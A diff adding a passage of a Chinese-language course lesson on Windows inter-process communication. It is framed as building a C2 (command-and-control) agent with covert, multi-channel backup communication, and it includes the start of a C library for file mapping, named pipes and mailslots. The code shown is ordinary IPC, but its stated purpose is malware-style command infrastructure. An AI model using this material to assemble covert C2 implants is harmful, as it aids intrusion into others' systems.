@@ -1,0 +1,808 @@
+<h1 id="section-1">课时06：进程通信专题 - 阶段合集</h1><h2 id="section-2">课程目标</h2><ol><li>综合运用各种进程间通信技术</li><li>构建完整的C2通信框架</li><li>实现多通道备份通信机制</li><li>掌握隐蔽通信技术的实战应用</li></ol><hr><h2 id="section-3">名词解释</h2><table><thead><tr><th>术语</th><th>解释</th></tr></thead><tbody><tr><td>C2</td><td>Command &amp; Control，命令与控制服务器</td></tr><tr><td>通道复用</td><td>使用多种通信方式作为备份</td></tr><tr><td>心跳包</td><td>定期发送的保活数据包</td></tr><tr><td>隐蔽通道</td><td>不易被检测的通信方式</td></tr><tr><td>IPC</td><td>Inter-Process Communication进程间通信</td></tr></tbody></table><hr><h2 id="section-4">使用工具</h2><table><thead><tr><th>工具</th><th>用途</th></tr></thead><tbody><tr><td>Visual Studio</td><td>编译调试</td></tr><tr><td>Process Monitor</td><td>监控IPC活动</td></tr><tr><td>API Monitor</td><td>API调用监控</td></tr><tr><td>Wireshark</td><td>网络通信分析（网络部分）</td></tr></tbody></table><hr><h2 id="section-5">技术原理</h2><h3 id="section-6">进程通信方式对比</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span>┌────────────────────────────────────────────────────────────┐</span></span>
+<span class="line"><span>│              进程间通信技术选择指南                          │</span></span>
+<span class="line"><span>├──────────────┬──────────────┬──────────────┬───────────────┤</span></span>
+<span class="line"><span>│     技术     │     速度     │    复杂度    │    适用场景    │</span></span>
+<span class="line"><span>├──────────────┼──────────────┼──────────────┼───────────────┤</span></span>
+<span class="line"><span>│ 文件映射     │    ★★★★★   │     ★★★    │ 大数据/高频   │</span></span>
+<span class="line"><span>│ 命名管道     │    ★★★★    │     ★★★    │ 流式数据      │</span></span>
+<span class="line"><span>│ WM_COPYDATA  │    ★★★★    │     ★★      │ 窗口进程      │</span></span>
+<span class="line"><span>│ 邮槽         │    ★★★     │     ★       │ 简单广播      │</span></span>
+<span class="line"><span>│ 剪切板       │    ★★      │     ★       │ 少量数据      │</span></span>
+<span class="line"><span>│ 匿名管道     │    ★★★★    │     ★★      │ 父子进程      │</span></span>
+<span class="line"><span>└──────────────┴──────────────┴──────────────┴───────────────┘</span></span>
+<span class="line"><span></span></span></code></pre><h3 id="section-7">综合通信架构</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span>┌─────────────────────────────────────────────────────────────┐</span></span>
+<span class="line"><span>│                    C2 Agent 通信架构                         │</span></span>
+<span class="line"><span>│                                                             │</span></span>
+<span class="line"><span>│  ┌─────────────┐      ┌─────────────┐                      │</span></span>
+<span class="line"><span>│  │  主控进程    │←────→│  通信管理器  │                      │</span></span>
+<span class="line"><span>│  └─────────────┘      └──────┬──────┘                      │</span></span>
+<span class="line"><span>│                              │                              │</span></span>
+<span class="line"><span>│         ┌────────────┬───────┼───────┬────────────┐        │</span></span>
+<span class="line"><span>│         ↓            ↓       ↓       ↓            ↓        │</span></span>
+<span class="line"><span>│   ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │</span></span>
+<span class="line"><span>│   │ 文件映射  │ │ 命名管道  │ │ 邮槽    │ │ COPYDATA │     │</span></span>
+<span class="line"><span>│   └──────────┘ └──────────┘ └──────────┘ └──────────┘     │</span></span>
+<span class="line"><span>│         │            │       │            │               │</span></span>
+<span class="line"><span>│         └────────────┴───────┴────────────┘               │</span></span>
+<span class="line"><span>│                        ↓                                   │</span></span>
+<span class="line"><span>│              ┌──────────────────┐                         │</span></span>
+<span class="line"><span>│              │    子进程/模块    │                         │</span></span>
+<span class="line"><span>│              └──────────────────┘                         │</span></span>
+<span class="line"><span>└─────────────────────────────────────────────────────────────┘</span></span>
+<span class="line"><span></span></span></code></pre><hr><h2 id="section-8">代码实现</h2><h3 id="section-9">项目1：统一IPC通信库</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// IPCLib.h - 统一进程间通信库</span></span>
+<span class="line"><span style="color:#F97583">#ifndef</span><span style="color:#B392F0"> IPC_LIB_H</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> IPC_LIB_H</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;windows.h></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// IPC类型枚举</span></span>
+<span class="line"><span style="color:#F97583">typedef</span><span style="color:#F97583"> enum</span><span style="color:#E1E4E8"> _IPC_TYPE {</span></span>
+<span class="line"><span style="color:#E1E4E8">    IPC_TYPE_FILEMAPPING </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">    IPC_TYPE_NAMEDPIPE,</span></span>
+<span class="line"><span style="color:#E1E4E8">    IPC_TYPE_MAILSLOT,</span></span>
+<span class="line"><span style="color:#E1E4E8">    IPC_TYPE_WMCOPYDATA,</span></span>
+<span class="line"><span style="color:#E1E4E8">    IPC_TYPE_CLIPBOARD</span></span>
+<span class="line"><span style="color:#E1E4E8">} IPC_TYPE;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// IPC通道结构</span></span>
+<span class="line"><span style="color:#F97583">typedef</span><span style="color:#F97583"> struct</span><span style="color:#E1E4E8"> _IPC_CHANNEL {</span></span>
+<span class="line"><span style="color:#E1E4E8">    IPC_TYPE        Type;</span></span>
+<span class="line"><span style="color:#E1E4E8">    HANDLE          hChannel;</span></span>
+<span class="line"><span style="color:#E1E4E8">    LPVOID          pSharedMem;</span></span>
+<span class="line"><span style="color:#E1E4E8">    HWND            hWndTarget;</span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#FFAB70">            szName</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">256</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#E1E4E8">    BOOL            bServer;</span></span>
+<span class="line"><span style="color:#E1E4E8">    CRITICAL_SECTION cs;</span></span>
+<span class="line"><span style="color:#E1E4E8">} IPC_CHANNEL, </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">PIPC_CHANNEL;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 消息包结构</span></span>
+<span class="line"><span style="color:#F97583">typedef</span><span style="color:#F97583"> struct</span><span style="color:#E1E4E8"> _IPC_MESSAGE {</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD           dwMsgId;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD           dwFlags;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD           dwDataSize;</span></span>
+<span class="line"><span style="color:#E1E4E8">    BYTE            </span><span style="color:#FFAB70">bData</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">8000</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#E1E4E8">} IPC_MESSAGE, </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">PIPC_MESSAGE;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// API声明</span></span>
+<span class="line"><span style="color:#E1E4E8">PIPC_CHANNEL </span><span style="color:#B392F0">IPC_CreateChannel</span><span style="color:#E1E4E8">(IPC_TYPE </span><span style="color:#FFAB70">type</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> name</span><span style="color:#E1E4E8">, BOOL </span><span style="color:#FFAB70">bServer</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">VOID </span><span style="color:#B392F0">IPC_DestroyChannel</span><span style="color:#E1E4E8">(PIPC_CHANNEL </span><span style="color:#FFAB70">pChannel</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">IPC_Send</span><span style="color:#E1E4E8">(PIPC_CHANNEL </span><span style="color:#FFAB70">pChannel</span><span style="color:#E1E4E8">, PIPC_MESSAGE </span><span style="color:#FFAB70">pMsg</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">IPC_Receive</span><span style="color:#E1E4E8">(PIPC_CHANNEL </span><span style="color:#FFAB70">pChannel</span><span style="color:#E1E4E8">, PIPC_MESSAGE </span><span style="color:#FFAB70">pMsg</span><span style="color:#E1E4E8">, DWORD </span><span style="color:#FFAB70">dwTimeout</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">IPC_IsConnected</span><span style="color:#E1E4E8">(PIPC_CHANNEL </span><span style="color:#FFAB70">pChannel</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#endif</span></span>
+<span class="line"></span></code></pre><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// IPCLib.c - 统一进程间通信库实现</span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> "IPCLib.h"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> FILEMAPPING_SIZE</span><span style="color:#79B8FF"> 8192</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// ======================== 文件映射实现 ========================</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">static</span><span style="color:#E1E4E8"> PIPC_CHANNEL </span><span style="color:#B392F0">CreateFileMappingChannel</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> name</span><span style="color:#E1E4E8">, BOOL </span><span style="color:#FFAB70">bServer</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    PIPC_CHANNEL pChannel </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (PIPC_CHANNEL)</span><span style="color:#B392F0">malloc</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(IPC_CHANNEL));</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pChannel) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    memset</span><span style="color:#E1E4E8">(pChannel, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(IPC_CHANNEL));</span></span>
+<span class="line"><span style="color:#E1E4E8">    pChannel->Type </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> IPC_TYPE_FILEMAPPING;</span></span>
+<span class="line"><span style="color:#E1E4E8">    pChannel->bServer </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> bServer;</span></span>
+<span class="line"><span style="color:#B392F0">    sprintf</span><span style="color:#E1E4E8">(pChannel->szName, </span><span style="color:#9ECBFF">"Local</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">IPC_FM_</span><span style="color:#79B8FF">%s</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, name);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    InitializeCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pChannel->cs);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (bServer) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        pChannel->hChannel </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateFileMappingA</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">            INVALID_HANDLE_VALUE, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, PAGE_READWRITE,</span></span>
+<span class="line"><span style="color:#79B8FF">            0</span><span style="color:#E1E4E8">, FILEMAPPING_SIZE, pChannel->szName);</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">        pChannel->hChannel </span><span style="color:#F97583">=</span><span style="color:#B392F0"> OpenFileMappingA</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">            FILE_MAP_ALL_ACCESS, </span><span style="color:#79B8FF">FALSE</span><span style="color:#E1E4E8">, pChannel->szName);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pChannel->hChannel) {</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pChannel->cs);</span></span>
+<span class="line"><span style="color:#B392F0">        free</span><span style="color:#E1E4E8">(pChannel);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    pChannel->pSharedMem </span><span style="color:#F97583">=</span><span style="color:#B392F0"> MapViewOfFile</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">        pChannel->hChannel, FILE_MAP_ALL_ACCESS, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, FILEMAPPING_SIZE);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pChannel->pSharedMem) {</span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(pChannel->hChannel);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pChannel->cs);</span></span>
+<span class="line"><span style="color:#B392F0">        free</span><span style="color:#E1E4E8">(pChannel);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> pChannel;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// ======================== 命名管道实现 ========================</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">static</span><span style="color:#E1E4E8"> PIPC_CHANNEL </span><span style="color:#B392F0">CreateNamedPipeChannel</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> name</span><span style="color:#E1E4E8">, BOOL </span><span style="color:#FFAB70">bServer</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    PIPC_CHANNEL pChannel </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (PIPC_CHANNEL)</span><span style="color:#B392F0">malloc</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(IPC_CHANNEL));</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pChannel) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    memset</span><span style="color:#E1E4E8">(pChannel, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(IPC_CHANNEL));</span></span>
+<span class="line"><span style="color:#E1E4E8">    pChannel->Type </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> IPC_TYPE_NAMEDPIPE;</span></span>
+<span class="line"><span style="color:#E1E4E8">    pChannel->bServer </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> bServer;</span></span>
+<span class="line"><span style="color:#B392F0">    sprintf</span><span style="color:#E1E4E8">(pChannel->szName, </span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\\\\</span><span style="color:#9ECBFF">.</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">pipe</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">IPC_</span><span style="color:#79B8FF">%s</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, name);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    InitializeCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pChannel->cs);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (bServer) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        pChannel->hChannel </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateNamedPipeA</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">            pChannel->szName,</span></span>
+<span class="line"><span style="color:#E1E4E8">            PIPE_ACCESS_DUPLEX,</span></span>
+<span class="line"><span style="color:#E1E4E8">            PIPE_TYPE_MESSAGE </span><span style="color:#F97583">|</span><span style="color:#E1E4E8"> PIPE_READMODE_MESSAGE </span><span style="color:#F97583">|</span><span style="color:#E1E4E8"> PIPE_WAIT,</span></span>
+<span class="line"><span style="color:#79B8FF">            1</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">8192</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">8192</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">        pChannel->hChannel </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateFileA</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">            pChannel->szName,</span></span>
+<span class="line"><span style="color:#E1E4E8">            GENERIC_READ </span><span style="color:#F97583">|</span><span style="color:#E1E4E8"> GENERIC_WRITE,</span></span>
+<span class="line"><span style="color:#79B8FF">            0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, OPEN_EXISTING, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (pChannel->hChannel </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE) {</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pChannel->cs);</span></span>
+<span class="line"><span style="color:#B392F0">        free</span><span style="color:#E1E4E8">(pChannel);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> pChannel;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// ======================== 邮槽实现 ========================</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">static</span><span style="color:#E1E4E8"> PIPC_CHANNEL </span><span style="color:#B392F0">CreateMailslotChannel</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> name</span><span style="color:#E1E4E8">, BOOL </span><span style="color:#FFAB70">bServer</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    PIPC_CHANNEL pChannel </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (PIPC_CHANNEL)</span><span style="color:#B392F0">malloc</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(IPC_CHANNEL));</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pChannel) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    memset</span><span style="color:#E1E4E8">(pChannel, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(IPC_CHANNEL));</span></span>
+<span class="line"><span style="color:#E1E4E8">    pChannel->Type </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> IPC_TYPE_MAILSLOT;</span></span>
+<span class="line"><span style="color:#E1E4E8">    pChannel->bServer </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> bServer;</span></span>
+<span class="line"><span style="color:#B392F0">    sprintf</span><span style="color:#E1E4E8">(pChannel->szName, </span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\\\\</span><span style="color:#9ECBFF">.</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">mailslot</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">IPC_</span><span style="color:#79B8FF">%s</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, name);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    InitializeCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pChannel->cs);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (bServer) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        pChannel->hChannel </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateMailslotA</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">            pChannel->szName, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, MAILSLOT_WAIT_FOREVER, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">        pChannel->hChannel </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateFileA</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">            pChannel->szName,</span></span>
+<span class="line"><span style="color:#E1E4E8">            GENERIC_WRITE, FILE_SHARE_READ,</span></span>
+<span class="line"><span style="color:#79B8FF">            NULL</span><span style="color:#E1E4E8">, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (pChannel->hChannel </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE) {</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pChannel->cs);</span></span>
+<span class="line"><span style="color:#B392F0">        free</span><span style="color:#E1E4E8">(pChannel);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> pChannel;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// ======================== 统一接口 ========================</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">PIPC_CHANNEL </span><span style="color:#B392F0">IPC_CreateChannel</span><span style="color:#E1E4E8">(IPC_TYPE </span><span style="color:#FFAB70">type</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> name</span><span style="color:#E1E4E8">, BOOL </span><span style="color:#FFAB70">bServer</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    switch</span><span style="color:#E1E4E8"> (type) {</span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> IPC_TYPE_FILEMAPPING:</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#B392F0"> CreateFileMappingChannel</span><span style="color:#E1E4E8">(name, bServer);</span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> IPC_TYPE_NAMEDPIPE:</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#B392F0"> CreateNamedPipeChannel</span><span style="color:#E1E4E8">(name, bServer);</span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> IPC_TYPE_MAILSLOT:</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#B392F0"> CreateMailslotChannel</span><span style="color:#E1E4E8">(name, bServer);</span></span>
+<span class="line"><span style="color:#F97583">        default</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">VOID </span><span style="color:#B392F0">IPC_DestroyChannel</span><span style="color:#E1E4E8">(PIPC_CHANNEL </span><span style="color:#FFAB70">pChannel</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pChannel) </span><span style="color:#F97583">return</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    EnterCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pChannel->cs);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    switch</span><span style="color:#E1E4E8"> (pChannel->Type) {</span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> IPC_TYPE_FILEMAPPING:</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (pChannel</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">pSharedMem) </span><span style="color:#B392F0">UnmapViewOfFile</span><span style="color:#E1E4E8">(pChannel</span><span style="color:#F97583">-></span><span style="color:#FFAB70">pSharedMem</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (pChannel</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">hChannel) </span><span style="color:#B392F0">CloseHandle</span><span style="color:#E1E4E8">(pChannel</span><span style="color:#F97583">-></span><span style="color:#FFAB70">hChannel</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> IPC_TYPE_NAMEDPIPE:</span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> IPC_TYPE_MAILSLOT:</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (pChannel</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">hChannel </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE)</span></span>
+<span class="line"><span style="color:#B392F0">                CloseHandle</span><span style="color:#E1E4E8">(pChannel</span><span style="color:#F97583">-></span><span style="color:#FFAB70">hChannel</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
